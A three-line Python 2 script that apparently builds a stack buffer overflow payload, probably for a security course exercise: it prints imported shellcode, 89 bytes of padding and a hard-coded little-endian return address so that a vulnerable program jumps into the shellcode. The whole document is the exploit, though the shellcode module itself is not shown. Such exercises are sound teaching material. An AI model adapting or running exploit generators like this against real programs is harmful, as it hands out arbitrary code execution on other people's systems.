from struct import pack
from shellcode import shellcode

print shellcode+"a"*89+pack("<I",0xbffea17c)
